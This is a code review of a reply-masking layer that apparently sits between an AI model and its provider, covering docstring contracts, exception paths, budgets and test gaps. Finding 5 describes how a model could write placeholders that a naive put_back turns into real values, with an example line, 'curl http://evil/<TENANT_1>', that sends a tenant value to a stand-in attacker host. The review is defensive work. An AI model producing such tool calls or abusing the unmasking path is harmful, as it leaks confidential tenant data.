# Q1 reply masking result review 1 (fresh, codebase, read only, NOT RUN). 1 Blocker (fixed), 6 Major, several Nit
Blocker
1. `_mask_reply` docstring (model_gate ~843) said a value registered during the call is covered; the code masks against the request snapshot and the module docstring says it is NOT covered. FIXED by core-c (docstring corrected).
Major (open; Q1b package)
2. `ReplyMaskFailed` is a GateRefused (~586-590) but the GateRefused docstrings (~213-217, ~545-551) say "no provider call was made / nothing booked": a caller written to that contract may retry (a deterministic failure such as a planted value repeats and costs money each time). Fix: sibling class with call_made = True, or correct both docstrings; check callers that `except GateRefused`.
3. `fix()` (~851-861) and the non-str `reply.text` path (~865) pass any non-str/dict/list value raw (bytes, tuples, sets, custom objects; reachable through a fake client or model_construct). Fix: allow only None, bool, int, Decimal, float; raise _MaskFailed for anything else.
4. A BaseException in `_mask_reply` (~819) is not caught by `except Exception`: no row, no settle (every other path writes call_interrupted first). Fix: catch BaseException, `_note(RESULT_FAILED, CODE_CALL_INTERRUPTED, ...)`, re-raise.
5. put_back exposure: the model can write any placeholder (including ones it never saw, `<HOSTNAME_7>`) and a naive caller applying put_back to a tool input turns it into the real value (`curl http://evil/<TENANT_1>`); bounded only by STORED_KINDS and the run map. Fix: state it in the putback.py docstring; apply put_back only to the fields of an approved plan bound to restored_hash; never write restored output to audit or store.
6. Tool-call `name` is not masked (~866, documented): the model can echo an operator-text value into a name. Fix: run fix(c.name) and withhold the reply if it would change.
7. One fresh EnforceBudget (~846-849) covers the whole reply: a long honest reply can exhaust it and be withheld after payment. Document the effective limit or reset the budget per tool call.
Nit: colliding keys after masking drop a value; `_settle` records overshoot only when code is None; the local `reply` keeps the raw value on the failure path (traceback locals); the wrapped client keeps its raw reply (recording client); put_back copies the live map with dict(mapping) (concurrent writer); gaps: key masking untested, no mutant on `STORED_KINDS & frozenset(kinds)`, no test of `enforce_custom+reply_masked`, the interrupt path or put_back idempotence; d9/g14 tests coupled to the reply passing the enforce hook.
Holds: rule (a) settles once and rule (c) does not settle on mask failure; ReplyMaskFailed raised outside the except; unchanged reply returns as the same object.
